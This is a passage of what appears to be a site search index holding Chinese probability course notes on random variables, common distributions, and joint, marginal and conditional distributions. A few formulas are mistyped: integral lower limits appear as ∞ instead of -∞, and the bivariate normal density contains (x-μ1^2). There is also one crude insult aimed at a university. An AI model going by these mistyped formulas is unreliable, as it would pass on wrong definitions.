<p>\u5e38\u89c1\u7684\u4e24\u7c7b\u968f\u673a\u53d8\u91cf\u5206\u522b\u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u548c\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf</p>"},{"location":"Courses/PS/CH2/#_3","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u53d6\u503c\u81f3\u591a\u53ef\u6570\u7684\u968f\u673a\u53d8\u91cf\u79f0\u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u6982\u7387\u5206\u5e03\uff08\u5206\u5e03\u5f8b\uff09\u4e3a\uff1a</p> X \\(x_1\\) \\(x_2\\) ... \\(x_i\\) ... P \\(p_1\\) \\(p_2\\) ... \\(p_i\\) ... \\[ \\text{\u4e14\u6709} p_i\\ge 0,\\ \\sum p_i=1 \\] <p>\u4f8b 1\uff1a</p> <p>\u67d0\u4eba\u4e0a\u5b66\u8def\u4e0a\u8981\u7ecf\u8fc7\u4e09\u4e2a\u7ea2\u7eff\u706f\uff0c\u6bcf\u6b21\u5230\u8def\u53e3\u65f6\u4e3a\u7ea2\u706f\u7684\u6982\u7387\u4e3a \\(p\\) \uff0c\u4ee5 \\(X\\) \u8868\u793a\u9996\u6b21\u505c\u8f66\u65f6\u6240\u901a\u8fc7\u7684\u7ea2\u7eff\u706f\u6570\uff0c\u6c42\u5176\u6982\u7387\u5206\u5e03\u5f8b\uff1a</p> X 0 1 2 3 P \\(p\\) \\(p(1-p)\\) \\(p(1-p)^2\\) \\((1-p)^3\\) <p>\u4f8b 2\uff1a</p> <p>\u82e5\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6982\u7387\u5206\u5e03\u5f8b\u4e3a</p> \\[ P(X=k)=\\frac{c\\lambda^k}{k!},\\ k=0,1,2,...,\\ \\lambda \\gt 0 \\] <p>\u6c42\u5e38\u6570 c\uff1a</p> \\[ 1=\\sum P(X=k) = c\\sum \\frac{\\lambda^k}{k!} =c e^{\\lambda} \\]"},{"location":"Courses/PS/CH2/#0-1","title":"0-1 \u5206\u5e03","text":"<p>\u82e5\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5206\u5e03\u5f8b\u4e3a\uff1a</p> X 0 1 P \\(1-p\\) \\(p\\) <p>\u5219\u79f0 \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(p\\) \u7684 0-1 \u5206\u5e03\uff08\u4e24\u70b9\u5206\u5e03\uff09\uff0c\u8bb0\u4e3a \\(X\\sim 0-1(p)\\) \u6216 \\(B(1,p)\\)</p> <p>\u5b83\u7684\u5206\u5e03\u5f8b\u4e5f\u53ef\u4ee5\u5199\u4f5c\uff1a</p> \\[ P(X=k)=p^k (1-p)^{1-k} \\] <p>\u5bf9\u4e8e\u4e00\u4e2a\u6837\u672c\u7a7a\u95f4\u4ec5\u542b\u4e24\u4e2a\u5143\u7d20\u7684\u968f\u673a\u4e8b\u4ef6 \\(S=\\{e_1, e_2\\}\\) \uff0c\u6211\u4eec\u603b\u80fd\u5728 \\(S\\) \u4e0a\u5b9a\u4e49\u4e00\u4e2a\u670d\u4ece 0-1 \u5206\u5e03\u7684\u968f\u673a\u53d8\u91cf\u6765\u63cf\u8ff0\u8fd9\u4e2a\u968f\u673a\u8bd5\u9a8c\u7684\u7ed3\u679c\uff1a</p> \\[ X=X(e)=\\left \\{ \\begin{array}l 0 , &amp; \\text{\u5f53} e=e_1 \\\\  1, &amp; \\text{\u5f53} e=e_2 \\end{array} \\right . \\]"},{"location":"Courses/PS/CH2/#_4","title":"\u4e8c\u9879\u5206\u5e03","text":"<p>\u8bbe\u8bd5\u9a8c \\(E\\) \u53ea\u6709\u4e24\u79cd\u53ef\u80fd\u7684\u7ed3\u679c\uff1a\\(A\\) \u548c \\(\\overline{A}\\) \uff0c\\(p(A)=p\\) \uff0c\u5c06\u8bd5\u9a8c \\(E\\) \u72ec\u7acb\u5730\u91cd\u590d\u8fdb\u884c n \u6b21\uff0c\u5219\u79f0\u8fd9\u4e00\u4e32\u91cd\u590d\u7684\u72ec\u7acb\u8bd5\u9a8c\u4e3a n\u91cd\u8d1d\u52aa\u5229\u8bd5\u9a8c</p> <p>\u8bbe \\(A\\) \u5728n\u91cd\u8d1d\u52aa\u5229\u8bd5\u9a8c\u4e2d\u53d1\u751f \\(X\\) \u6b21\uff0c\u5219\u5176\u5206\u5e03\u5f8b\u4e3a\uff1a</p> \\[ P(X=k) =C^k _n p^k(1-p) ^{n-k},\\ k=0,1,... \\] <p>\u5219\u79f0 \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(p\\) \u7684\u4e8c\u9879\u5206\u5e03\uff0c\u8bb0\u4e3a \\(X\\sim B(n,p)\\)</p>"},{"location":"Courses/PS/CH2/#_5","title":"\u6cca\u677e\u5206\u5e03","text":"<p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6982\u7387\u5206\u5e03\u5f8b\u4e3a\uff1a</p> \\[ P(X=k) =\\frac{\\lambda^k e^{-\\lambda}}{k!},\\ k=0,1,2,...,\\ \\lambda \\gt 0 \\] <p>\u5219\u79f0 \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(\\lambda\\) \u7684\u6cca\u677e\u5206\u5e03\uff0c\u8bb0\u4e3a \\(X=P(\\lambda)\\)</p> <p>\u4e8c\u9879\u5206\u5e03\u548c\u6cca\u677e\u5206\u5e03\u6709\u5982\u4e0b\u8fd1\u4f3c\u516c\u5f0f</p> <p></p>"},{"location":"Courses/PS/CH2/#_6","title":"\u8d85\u51e0\u4f55\u5206\u5e03","text":"<p>\u82e5\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6982\u7387\u5206\u5e03\u5f8b\u4e3a\uff1a</p> \\[ P(X=k) =\\frac{C^k _a C^{n-k}_b}{C ^n_N},\\ k=l_1, l_1+1,..., l_2 \\] <p>\u5176\u4e2d \\(l_1 = \\max (0,n-b),\\ l_2=min(a,n)\\) \u3002\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u8d85\u51e0\u4f55\u5206\u5e03</p> <p>\u4f8b\u5b50</p> <p>\u4e00\u888b\u4e2d\u6709 a \u4e2a\u767d\u7403\uff0cb \u4e2a\u7ea2\u7403\uff0ca+b=N\u3002\u4ece\u4e2d\u4e0d\u653e\u56de\u5730\u53d6 n \u4e2a\u7403\uff0c\u8bbe\u6bcf\u6b21\u53d6\u5230\u5404\u7403\u7684\u6982\u7387\u76f8\u7b49\uff0c\u4ee5 \\(X\\) \u8868\u793a\u53d6\u5230\u7684\u767d\u7403\u6570\uff0c\u5219 \\(X\\) \u670d\u4ece\u8d85\u51e0\u4f55\u5206\u5e03\u3002</p>"},{"location":"Courses/PS/CH2/#_7","title":"\u51e0\u4f55\u5206\u5e03","text":"<p>\u82e5\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6982\u7387\u5206\u5e03\u5f8b\u4e3a\uff1a</p> \\[ P(X=k)=p(1-p)^{k-1},\\ k=1,2,3,...,\\ 0\\lt p\\lt 1 \\] <p>\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570 \\(p\\) \u7684\u51e0\u4f55\u5206\u5e03</p>"},{"location":"Courses/PS/CH2/#_8","title":"\u5df4\u65af\u5361\u5206\u5e03","text":"<p>\u82e5\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6982\u7387\u5206\u5e03\u5f8b\u4e3a\uff1a</p> \\[ P(X=k)=C^{r-1}_{k-1} p^r(1-p) ^{k-r},\\ k=r,r+1,r+2,... \\] <p>\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\((r,p)\\) \u7684\u5df4\u65af\u5361\u5206\u5e03</p>"},{"location":"Courses/PS/CH2/#_9","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u5bf9\u4e8e\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5206\u5e03\u51fd\u6570 \\(F(x)\\) \uff0c\u82e5\u5b58\u5728\u975e\u8d1f\u7684\u51fd\u6570 \\(f(x)\\) \u4f7f\u5f97\u5bf9\u4e8e\u4efb\u610f\u5b9e\u6570 \\(x\\) \u90fd\u6709\uff1a</p> \\[ F(x)=\\int_\\infty ^x f(t)dt \\] <p>\u5219\u79f0 \\(X\\) \u4e3a\u8fde\u7eed\u6027\u968f\u673a\u53d8\u91cf\u3002\u5176\u4e2d \\(f(x)\\) \u4e3a\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff0c\u7b80\u79f0 \u5bc6\u5ea6\u51fd\u6570 \uff0c\u5176\u6709\u5982\u4e0b\u6027\u8d28\uff1a</p> <p>\uff081\uff09\\(f(x)\\ge 0\\)</p> <p>\uff082\uff09\\(\\int _{-\\infty} ^{+\\infty} f(x)dx=1\\)</p> <p>\uff083\uff09\u5bf9\u4efb\u610f\u5b9e\u6570 \\(x_1,x _2( x_2\\gt x_1)\\) \uff0c\u6709 \\(P\\{x_1 \\lt X\\le x_2\\}= \\int _{x_1} ^{x_2}f(x)dx\\)</p> <p>\uff084\uff09\u5728\u8fde\u7eed\u70b9\uff0c\\(F'(x)=f(x)\\)</p> <p>\u6982\u7387\u4e3a\u96f6\u4e0d\u4e00\u5b9a\u4e3a\u4e0d\u53ef\u80fd\u4e8b\u4ef6</p>"},{"location":"Courses/PS/CH2/#_10","title":"\u5747\u5300\u5206\u5e03","text":"<p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u5177\u6709\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ f(x)=\\left \\{ \\begin{array}l \\frac{1}{b-a}, &amp; x\\in (a,b) \\\\ 0, &amp; \\text{\u5176\u4ed6} \\end{array}  \\right . \\] <p>\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X\\) \u5728\u533a\u95f4 \\((a,b)\\) \u4e0a\u670d\u4ece\u5747\u5300\u5206\u5e03\uff0c\u8bb0\u4e3a \\(X\\sim U(a,b)\\)</p>"},{"location":"Courses/PS/CH2/#_11","title":"\u6307\u6570\u5206\u5e03","text":"<p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u5177\u6709\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ f(x)= \\left \\{ \\begin{array}l  \\lambda e^{-\\lambda x} &amp; , x\\gt 0 \\\\ 0 &amp; , x\\le 0  \\end{array} \\right . \\] <p>\u5176\u4e2d \\(\\lambda \\gt 0\\) \u4e3a\u5e38\u6570\uff0c\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(\\lambda\\) \u7684\u6307\u6570\u5206\u5e03\uff0c\u8bb0\u4e3a \\(X\\sim Exp(\\lambda)\\) \u6216 \\(X\\sim E(\\lambda)\\)</p> <p>\u6839\u636e\u5b9a\u4e49\u53ef\u5f97\u6307\u6570\u5206\u5e03\u7684\u5206\u5e03\u51fd\u6570\u4e3a\uff1a</p> \\[ F(x) =\\left \\{ \\begin{array}l 1-e^{-\\lambda x}, &amp; x\\gt 0 \\\\ 0, &amp; x\\le 0 \\end{array} \\right . \\] <p>\u9700\u8981\u7279\u522b\u6ce8\u610f\uff0c\u6307\u6570\u5206\u5e03\u7684 \\(X\\) \u5177\u6709\u4ee5\u4e0b \u65e0\u8bb0\u5fc6\u6027 </p> \\[ P(X\\gt t_0 +t |X\\gt t_0) = P(X\\gt t) \\] <p>\u5982\u679c \\(X\\) \u8868\u793a\u7b49\u5f85\u65f6\u95f4\uff0c\u90a3\u4e48\u65e0\u8bb0\u5fc6\u6027\u8868\u660e\u53ea\u8981\u8fd8\u6ca1\u7b49\u5230\uff0c\u5269\u4f59\u7b49\u5f85\u65f6\u95f4\u4ecd\u7136\u670d\u4ece\u53c2\u6570\u4e3a \\(\\lambda\\) \u7684\u6307\u6570\u5206\u5e03\uff1b</p> <p>\u5982\u679c \\(X\\) \u8868\u793a\u5143\u4ef6\u5bff\u547d\uff0c\u90a3\u4e48\u65e0\u8bb0\u5fc6\u6027\u8868\u660e\u53ea\u8981\u8fd8\u6ca1\u574f\u6389\uff0c\u5269\u4f59\u5143\u4ef6\u5bff\u547d\u4ecd\u7136\u670d\u4ece\u53c2\u6570\u4e3a \\(\\lambda\\) \u7684\u6307\u6570\u5206\u5e03\u3002</p> <p>\u4f8b\u9898</p> \u9898\u9762\u7b54\u6848 <p></p> <p></p>"},{"location":"Courses/PS/CH2/#_12","title":"\u6b63\u6001\u5206\u5e03","text":"<p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u5177\u6709\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ f(x)=\\frac{1}{\\sqrt{2\\pi} \\sigma} e^{-\\frac{(x-\\mu) ^2}{2\\sigma ^2}},\\ -\\infty \\lt x\\lt \\infty \\] <p>\u5176\u4e2d \\(-\\infty \\lt \\mu\\lt \\infty,\\ \\sigma \\gt 0\\) \u4e3a\u5e38\u6570\uff0c\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(\\mu,\\sigma\\) \u7684\u6b63\u6001\u5206\u5e03\uff08Gauss\u5206\u5e03\uff09\uff0c\u8bb0\u4e3a \\(X\\sim N(\\mu,\\sigma^2)\\)</p> <p>\u5728\u81ea\u7136\u73b0\u8c61\u548c\u793e\u4f1a\u73b0\u8c61\u4e2d\uff0c\u5927\u91cf\u968f\u673a\u53d8\u91cf\u670d\u4ece\u6216\u8fd1\u4f3c\u670d\u4ece\u6b63\u6001\u5206\u5e03</p> <p>\u50bb\u903c\u6d59\u5927\u6b63\u6001\u5206\u5e03</p> <p></p>"},{"location":"Courses/PS/CH2/#_13","title":"\u968f\u673a\u53d8\u91cf\u7684\u6982\u7387\u5206\u5e03\u51fd\u6570","text":"<p>\u968f\u673a\u53d8\u91cf \\(X\\) \uff0c\u82e5\u5bf9\u4efb\u610f\u5b9e\u6570 \\(x\\) \uff0c\u51fd\u6570 \\(F(x)=P(X\\le x)\\) \uff0c\u79f0\u5176\u4e3a \\(X\\) \u7684\u5206\u5e03\u51fd\u6570\u3002</p> <ul> <li>\uff081\uff09\\(0\\le F(x)\\le 1\\)</li> <li>\uff082\uff09\\(F(x)\\) \u5355\u8c03\u4e0d\u51cf\uff0c\u4e14 \\(F(-\\infty) =0,F(+\\infty)=1\\)<ul> <li>\\(P(x_1\\lt X\\le x_2)= F(x_2) -F(x_1)\\)</li> </ul> </li> <li>\uff083\uff09\\(F(x)\\) \u53f3\u8fde\u7eed\uff0c\u5373 \\(F(x+0)=F(x)\\)</li> <li>\uff084\uff09\\(P(X=x)=F(x)-F(x-0)\\)</li> </ul> <p>\u4e00\u822c\u7684\uff0c\u8bbe\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u5f8b\u4e3a \\(P(X=x_k)= p_k\\) \uff0c\u7531\u6982\u7387\u7684\u53ef\u5217\u53ef\u52a0\u6027\u5f97 \\(X\\) \u7684\u5206\u5e03\u51fd\u6570\u4e3a\uff1a</p> \\[ F(x)=\\sum _{x_k\\le x} p_k \\] <p>\u5206\u5e03\u51fd\u6570\u5728 \\(x=x_k\\) \u5904\u5747\u6709\u8df3\u8dc3\uff0c\u8df3\u8dc3\u503c\u4e3a \\(p_k=P(X= x_k)\\)</p>"},{"location":"Courses/PS/CH2/#_14","title":"\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03","text":"<p>\u5728\u5b9e\u9645\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u5e38\u4f1a\u78b0\u5230\u5df2\u77e5\u4e00\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\uff0c\u8981\u6c42\u8fd9\u4e00\u53d8\u91cf\u7684\u51fd\u6570\u5206\u5e03\u95ee\u9898\u3002\u4f8b\u5982\uff0c\u6d4b\u91cf\u4e00\u4e2a\u5706\u7684\u9762\u79ef\uff0c\u603b\u662f\u6d4b\u91cf\u5176\u534a\u5f84\uff1b\u800c\u534a\u5f84\u7684\u6d4b\u91cf\u503c\u53ef\u770b\u4f5c\u968f\u673a\u53d8\u91cf \\(X\\) \uff0c\u5219\u6c42\u5bf9\u5e94\u5706\u9762\u79ef\u7684\u5206\u5e03\u3002</p> <p>\u8fd9\u7c7b\u9898\u7684\u505a\u9898\u6b65\u9aa4\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; \u786e\u5b9a \\(Y\\) \u7684\u53d6\u503c\u8303\u56f4</li> <li>&lt;2&gt; \u5199\u51fa \\(Y\\) \u7684\u6982\u7387\u5206\u5e03\u51fd\u6570 \\(F_Y (y)=P\\{Y\\le y\\}\\) \uff0c\u627e\u51fa \\(\\{Y\\le y\\}\\) \u7684\u7b49\u4ef7\u4e8b\u4ef6 \\(\\{x\\in D\\}\\) </li> <li>&lt;3&gt; \u5bf9\u5f97\u5230\u7684 \\(F_Y (y)\\) \u6c42\u5bfc\uff0c\u5f97\u5230\u5bf9\u5e94\u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570 \\(f_Y(y)\\)</li> </ul> <p>\u4f8b\u5b50</p> <p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u5177\u6709\u5bc6\u5ea6\u51fd\u6570 \\(f_X(x)\\) \uff0c\u6c42\u968f\u673a\u53d8\u91cf \\(Y=|X|\\) \u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff1a</p> <ul> <li>\u5f53 \\(y\\le 0\\) \u65f6\uff0c\\(F_Y(y)=0\\) </li> <li>\u5f53 \\(y\\gt 0\\) \u65f6\uff1a<ul> <li>\\(F_Y (y)=P\\{Y\\le y\\}=P\\{|X|\\le y\\}=F_X(y) - F_X(-y)\\)</li> <li>\u6c42\u5bfc\u53ef\u5f97 \\(f_Y(y)= f_X(y) + f_X(-y)\\)</li> </ul> </li> </ul> <p>\u7efc\u4e0a\uff1a</p> \\[ f_Y(y) = \\left \\{ \\begin{array}l f_X(y) + f_X(-y) &amp; ,y\\gt 0 \\\\ 0 &amp;, y\\le 0 \\end{array} \\right . \\]"},{"location":"Courses/PS/CH3/","title":"\u591a\u7ef4\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":""},{"location":"Courses/PS/CH3/#_1","title":"\u591a\u5143\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":"<p> \u7ea6 2179 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"},{"location":"Courses/PS/CH3/#_2","title":"\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u79f0\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u8054\u5408\u6982\u7387\u5206\u5e03\u5f8b\u5982\u4e0b\uff1a</p> \\[ P\\{X=x_i, Y=y_j\\} =p_{ij}, \\ \\ i,j=1,2,... \\] <p>\u7c7b\u4f3c\u4e00\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u6982\u7387\u5206\u5e03\u5f8b\u7684\u6027\u8d28\uff0c\u6613\u77e5\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u8054\u5408\u5206\u5e03\u5f8b\u6ee1\u8db3\uff1a</p> <ul> <li>&lt;1&gt; \\(p_{ij} \\ge 0\\)</li> <li>&lt;2&gt; \\(\\sum_i \\sum_j p_{ij}=1\\)</li> </ul> <p>\u4e0d\u540c\u7684\u662f\uff0c\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u5177\u6709\u8fb9\u9645\u5206\u5e03\uff0c\u5373\u56fa\u5b9a\u5176\u4e2d\u4e00\u4e2a\u53d8\u91cf\u503c\u4e0d\u53d8\uff0c\u6c42\u53e6\u4e00\u4e2a\u53d8\u91cf\u7684\u5206\u5e03\u5f8b\uff0c\u6b64\u5904\u4e0d\u518d\u5217\u51fa\u3002</p>"},{"location":"Courses/PS/CH3/#_3","title":"\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u51fd\u6570","text":"<p>\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u7684\u8054\u5408\u5206\u5e03\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ F(x,y)=P\\{X\\le x, Y\\le y\\} \\] <p>\u5176\u5173\u4e8e x \u548c y \u5747\u53f3\u8fde\u7eed</p> <p>\u6211\u4eec\u79f0\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u4e2d\u6bcf\u4e00\u4e2a\u5206\u91cf\u7684\u6982\u7387\u5206\u5e03\u5f8b\u4e3a\u8fb9\u9645\u5206\u5e03\u5f8b\uff0c\u5728\u6b64\u540c\u6837\u79f0\u6bcf\u4e00\u4e2a\u5206\u91cf\u7684\u5206\u5e03\u51fd\u6570\u4e3a\u8fb9\u9645\u5206\u5e03\u51fd\u6570\uff1a</p> \\[ F_X(x) = P\\{X\\le x\\} =P\\{X\\le x, y\\le +\\infty\\} = F(x, +\\infty) \\] <p>\u540c\u6837\uff0c\u53ef\u4ee5\u5b9a\u4e49\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u7684\u6761\u4ef6\u5206\u5e03\u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ F_{Y|X}(y| x_i) =P\\{Y\\le y|X= x_i\\} \\] <p>\u79f0\u4e3a\u5728\u7ed9\u5b9a \\(X=x_i\\) \u60c5\u51b5\u4e0b\uff0c\\(Y\\) \u7684\u6761\u4ef6\u5206\u5e03\u51fd\u6570\u3002</p> <p>\u7531\u4e8e\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7684\u5355\u4e2a\u70b9\u6982\u7387\u4e3a\u96f6\uff0c\u65e0\u6cd5\u4f5c\u4e3a\u9664\u6570\uff0c\u901a\u5e38\u9700\u8981\u5199\u6210\u4e00\u6bb5\u533a\u95f4\u7684\u5f62\u5f0f\uff1a</p> \\[ F_{Y|X}(y| x) =\\lim _{\\delta \\rightarrow 0^+} P\\{Y\\le y|x\\lt X\\le x +\\delta\\} \\]"},{"location":"Courses/PS/CH3/#_4","title":"\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf","text":""},{"location":"Courses/PS/CH3/#_5","title":"\u8054\u5408\u5206\u5e03","text":"<p>\u82e5\u5b58\u5728\u4e8c\u5143\u975e\u8d1f\u51fd\u6570 \\(f(x,y)\\) \uff0c\u4f7f\u5bf9\u4efb\u610f\u5b9e\u6570 \\(x,y\\) \u6709\uff1a</p> \\[ F(x,y) = \\int ^x_\\infty \\int _\\infty ^y f(u,v) dudv \\] <p>\u5219\u79f0 \\((X,Y)\\) \u4e3a\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\\(f(x,y)\\) \u4e3a\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\u3002</p> <p>\u5728\u4e09\u7ef4\u5750\u6807\u4e2d\u753b\u51fa\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\uff0c\u5219\u5176\u4f59xy\u5e73\u9762\u56f4\u6210\u7684\u9762\u79ef\u4e3a 1</p>"},{"location":"Courses/PS/CH3/#_6","title":"\u8fb9\u9645\u5206\u5e03","text":"<p>\u5355\u4e2a\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u8fb9\u9645\u5bc6\u5ea6\u51fd\u6570\u53ef\u7531\u5b83\u7684\u8fb9\u9645\u5206\u5e03\u51fd\u6570 \\(F_X(x)\\) \u6c42\u5bfc\u5f97\u5230\uff1a</p> \\[\\begin{array}c F_X(x)=P\\{X\\le x\\} = P\\{X\\le x,Y\\in (-\\infty,+\\infty)\\} = \\int_{-\\infty} ^x \\left[\\int _{-\\infty}^{+\\infty}f(x,y)dy\\right]dx \\\\ \\Rightarrow f_X(x) = \\int _{-\\infty}^{+\\infty}f(x,y)dy \\end{array} \\] <p>\u5373\u8fb9\u9645\u5bc6\u5ea6\u51fd\u6570\u4e3a\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\u5173\u4e8e\u53e6\u4e00\u4e2a\u53d8\u91cf\u5728 \\((-\\infty, +\\infty)\\) \u4e0a\u7684\u79ef\u5206\u3002</p>"},{"location":"Courses/PS/CH3/#_7","title":"\u6761\u4ef6\u5206\u5e03","text":"<p>\u4e0a\u9762\u8c08\u8fc7\uff0c\u5bf9\u4e8e\u4e8c\u7ef4\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7684\u6761\u4ef6\u5206\u5e03\u51fd\u6570\uff0c\u9700\u8981\u5199\u6210\u4e00\u6bb5\u533a\u95f4\u5f62\u5f0f\u6765\u8ba1\u7b97\uff1a</p> \\[ \\begin{array}l F_{Y|X}(y|x) &amp; =\\lim _{\\delta \\rightarrow 0^+} P\\{Y\\le y| x\\lt X\\ \\le x+\\delta\\} \\\\ &amp; =\\lim _{\\delta \\rightarrow 0^+} \\frac{P\\{x\\lt X\\le x+\\delta, Y\\le y\\}}{P\\{x\\lt X\\le x+\\delta\\}} \\\\ &amp; =\\lim _{\\delta \\rightarrow 0^+}\\frac{F(x+\\delta, y)-F(x,y)}{F_X(x+\\delta)- F_X(x)} \\\\ &amp; = \\lim _{\\delta \\rightarrow 0^+} \\frac{(F(x+\\delta, y)-F(x,y))/\\delta  }{(F_X(x+\\delta)- F_X(x))/\\delta   } \\\\ &amp; =\\int_{-\\infty}^y \\frac{f(x,v)}{f_X(x)}dv \\end{array} \\] <p>\u5bf9\u5176\u5173\u4e8e \\(y\\) \u6c42\u5bfc\uff0c\u5f97\u5230\u7ed9\u5b9a \\(\\{X=x\\}\\) \u6761\u4ef6\u4e0b\uff0c\\(Y\\) \u7684\u6761\u4ef6\u5bc6\u5ea6\u51fd\u6570\u4e3a\uff1a</p> \\[ f_{Y|X}(y|x) = \\frac{f(x,y)}{f_X(x)} \\]"},{"location":"Courses/PS/CH3/#_8","title":"\u4e8c\u5143\u5747\u5300\u5206\u5e03\u548c\u4e8c\u5143\u6b63\u6001\u5206\u5e03","text":""},{"location":"Courses/PS/CH3/#_9","title":"\u5747\u5300\u5206\u5e03","text":"<p>\u8bbe\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u5728\u4e8c\u7ef4\u6709\u754c\u533a\u95f4 \\(D\\) \u4e0a\u53d6\u503c\uff0c\u4e14\u5177\u6709\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ f(x,y) =\\left\\{ \\begin{array}l  \\frac{1}{S_D} , &amp; (x,y) \\in D \\\\ 0, &amp; \\text{\u5176\u5b83} \\end{array}   \\right . \\] <p>\u5219\u79f0 \\((x,y)\\) \u670d\u4ece \\(D\\) \u4e0a\u5747\u5300\u5206\u5e03\u3002</p>"},{"location":"Courses/PS/CH3/#_10","title":"\u6b63\u6001\u5206\u5e03","text":"<p>\u8bbe\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u5177\u6709\u8054\u5408\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ f(x,y)=\\frac{1}{2\\pi \\sigma_1 \\sigma_2\\sqrt{1-\\rho ^2}}exp\\{- \\frac{1}{2(1-\\rho ^2)}\\left[ \\frac{(x-\\mu_1^2)}{\\sigma _1^2} - 2\\rho \\frac{(x-\\mu_1) (y-\\mu_2)}{\\sigma_1\\sigma _2}+ \\frac{(y-\\mu_2)^2}{\\sigma _2^2} \\right]\\} \\] <p>\u5176\u4e2d \\(|\\rho| \\lt 1\\) \uff0c\u5219\u79f0 \\((X,Y)\\) \u670d\u4ece\u53c2\u6570\u4e3a \\((\\mu_1, \\mu_2; \\sigma_1, \\sigma_2;\\rho)\\) \u7684\u4e8c\u5143\u6b63\u6001\u5206\u5e03\uff0c\u8bb0\u4e3a \\((X,Y) \\sim N(\\mu_1, \\mu_2; \\sigma_1, \\sigma_2;\\rho)\\)</p> <p>\u8fd9\u91cc\u7684 \\(\\rho\\) \u4e3a \\(X,Y\\) \u7684\u76f8\u5173\u6027\uff0c\u5177\u4f53\u5728 Chapter 4 \u4e2d\u6d89\u53ca</p>"},{"location":"Courses/PS/CH3/#_11","title":"\u968f\u673a\u53d8\u91cf\u7684\u72ec\u7acb\u6027","text":"<p>\u5bf9\u4efb\u610f\u4e24\u4e2a\u5b9e\u6570\u96c6\u5408 \\(D_1,D _2\\) \uff0c\u82e5</p> \\[ P\\{ X\\in D_1, Y\\in D_2 \\} = P\\{X\\in D_1\\}\\cdot P\\{Y\\in D_2\\} \\] <p>\u5219\u79f0\u968f\u673a\u53d8\u91cf \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5176\u4e00\u822c\u5199\u6210\u5982\u4e0b\u5f62\u5f0f\uff1a</p> \\[\\begin{array}c P\\{ X\\le x, Y\\le y \\} = P\\{X\\le x\\}\\cdot P\\{Y\\le y\\} \\\\ F(x,y) = F_X(x)\\cdot F_Y(y) \\end{array} \\] <p>\u5b9e\u9645\u4e0a\uff0c\u7531\u5fae\u79ef\u5206\u77e5\u8bc6\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230\uff1a</p> \\[ f(x,y) = f_X(x)\\cdot f_Y(y) \\] 